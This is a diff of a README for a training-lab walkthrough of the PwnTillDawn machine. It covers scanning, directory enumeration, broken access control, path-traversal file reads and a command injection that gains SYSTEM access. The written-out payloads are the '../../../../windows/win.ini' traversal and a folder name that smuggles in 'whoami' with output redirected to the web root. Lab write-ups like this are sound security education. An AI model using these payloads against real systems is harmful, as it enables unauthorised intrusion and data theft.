@@ -1,6 +1,5 @@
-# VULNERABLE-MACHINE-PwnTillDwn
 
-# 🛡️ Vulnerability Analysis Lab – PwnTillDawn 
+# 🛡️ Vulnerability Analysis Lab – PwnTillDawn
 
 ## 📌 Objective
 
@@ -39,17 +38,39 @@ sudo openvpn PwnTillDawn.ovpn
 Initialization Sequence Completed
 ```
 
-📸 *Screenshot: VPN connection success*
+<p align="center">
+  <img src="screenshots/vpn.png" width="700">
+</p>
+
+The VPN connection was successfully established, creating a secure tunnel to the lab network.
 
 ---
 
-## 🌐 Step 2 – Network Discovery
+## 🌐 Step 2 – Network Interface Verification
+
+```bash
+ip a
+```
+
+<p align="center">
+  <img src="screenshots/ip-a.png" width="700">
+</p>
+
+The `ip a` output confirms that the `tun0` interface is active with IP `10.66.67.206`, enabling communication with the target network.
+
+---
+
+## 🌐 Step 3 – Network Discovery
 
 Performed host discovery scan:
 
 ```bash
 nmap -sn 10.150.150.0/24
 ```
+
+<p align="center">
+  <img src="screenshots/nmap.png" width="700">
+</p>
 
 ### 📊 Results
 
@@ -62,19 +83,15 @@ Selected target:
 10.150.150.11
 ```
 
-📸 *Screenshot: nmap host discovery*
+The scan identified multiple active hosts. The target machine was selected based on responsiveness.
 
 ---
 
-## 🔍 Step 3 – Port & Service Enumeration
-
-Executed service scan:
+## 🔍 Step 4 – Port & Service Enumeration
 
 ```bash
 nmap -sC -sV 10.150.150.11
 ```
-
----
 
 ### 📊 Open Ports & Services
 
@@ -90,20 +107,16 @@ nmap -sC -sV 10.150.150.11
 | 3306 | MySQL   | MariaDB                |
 | 3389 | RDP     | Windows                |
 
----
-
 ### 🔎 Key Observations
 
 * Target OS: **Windows Server 2008 R2**
 * Multiple exposed services → large attack surface
-* Database services (MSSQL & MySQL) present
-* Web server running PHP-based application
-
-📸 *Screenshot: nmap scan output*
+* Database services available (MSSQL & MySQL)
+* Web server running PHP application
 
 ---
 
-## 🌐 Step 4 – Web Enumeration
+## 🌐 Step 5 – Web Enumeration
 
 Accessed web application:
 
@@ -115,15 +128,11 @@ Application identified:
 
 > **PwnDrive – Your Personal Online Storage**
 
----
-
-### 🔹 Directory Brute Force
+### 🔹 Directory Enumeration
 
 ```bash
 gobuster dir -u http://10.150.150.11 -w /usr/share/wordlists/dirb/common.txt
 ```
-
----
 
 ### 📂 Discovered Endpoints
 
@@ -137,31 +146,33 @@ gobuster dir -u http://10.150.150.11 -w /usr/share/wordlists/dirb/common.txt
 
 ---
 
-## 🚨 Step 5 – Vulnerability Discovery
+## 🚨 Step 6 – Vulnerability Discovery
 
 ### 🔴 1. Broken Access Control
 
 * `/admin` accessible without authentication
-* Able to **create users without login**
+* Able to create users without login
 
 👉 Critical misconfiguration
 
 ---
 
-### 🔴 2. File Upload Functionality
+### 🔴 2. File Upload Vulnerability
 
-After login:
+* Accessed `/myfiles.php`
+* Upload functionality available
 
-* Accessed: `/myfiles.php`
-* File upload allowed
-
-Uploaded files stored in:
+Files stored in:
 
 ```
 /upload/11/
 ```
 
-👉 Potential for web shell upload
+<p align="center">
+  <img src="screenshots/upload.png" width="700">
+</p>
+
+This confirms that file upload is not properly secured and can be abused.
 
 ---
 
@@ -173,29 +184,21 @@ Vulnerable endpoint:
 download.php?mode=view_file_content&filename=
 ```
 
----
-
-### ✅ Exploitation
-
-Accessed system file:
+Exploit:
 
 ```
 ../../../../windows/win.ini
 ```
 
-👉 Confirms LFI vulnerability
+✔ Successfully accessed system file
 
 ---
 
 ### 🔴 4. Source Code Disclosure
 
-Accessed configuration file:
-
 ```
 ../../../../xampp/htdocs/config.php
 ```
-
----
 
 ### 🔥 Critical Finding
 
@@ -203,54 +206,54 @@ Accessed configuration file:
 define('CMD_INJ_ON_FOLDER_CREATE', true);
 ```
 
-👉 Indicates **Command Injection vulnerability exists**
+👉 Reveals presence of command injection vulnerability
 
 ---
 
-## 💥 Step 6 – Exploitation (Command Injection)
+## 💥 Step 7 – Exploitation (Command Injection)
 
-Used folder creation feature to inject commands.
-
-### 🔹 Payload Used
+Payload used:
 
 ```
 test & whoami > C:\xampp\htdocs\upload\11\result.txt
 ```
 
----
-
 ### 📌 Explanation
 
-* `test` → normal folder name
+* `test` → valid input
 * `&` → command separator
-* `whoami` → executed on system
-* Output redirected to web-accessible file
+* `whoami` → executed command
+* Output saved to web directory
 
 ---
 
-## 🏆 Step 7 – Proof of Compromise
+## 🏆 Step 8 – Proof of Compromise
 
-Accessed result file:
+Accessed:
 
 ```
 http://10.150.150.11/upload/11/result.txt
 ```
 
----
+<p align="center">
+  <img src="screenshots/system.png" width="700">
+</p>
 
 ### ✅ Output
 
 ```
 nt authority\system
 ```
-📸 *Screenshot: result file output*
+
+This confirms successful command execution with SYSTEM privileges.
+
 ---
 
 ## 🎯 Final Result
 
 ✔ Remote Command Execution (RCE)
 ✔ SYSTEM-level access obtained
-✔ Full compromise achieved
+✔ Full system compromise achieved
 
 ---
 
@@ -267,11 +270,11 @@ nt authority\system
 
 ## 🧠 Lessons Learned
 
-* Poor access control exposes sensitive functionality
-* LFI can lead to **source code disclosure**
+* Misconfigured access control exposes admin functionality
+* LFI can lead to sensitive file disclosure
 * Source code analysis reveals hidden vulnerabilities
-* Command injection results in **full system compromise**
-* Always validate and sanitize user input
+* Command injection leads to full system compromise
+* Input validation is critical for web security
 
 ---
 
@@ -281,3 +284,13 @@ nt authority\system
 🏆 **Proof of Compromise Achieved (SYSTEM Access)**
 
 ---
+
+## 🔗 Attack Flow
+
+```
+Broken Access Control → File Upload → LFI → Source Code Disclosure → Command Injection → SYSTEM Access
+```
+
+---
+
+
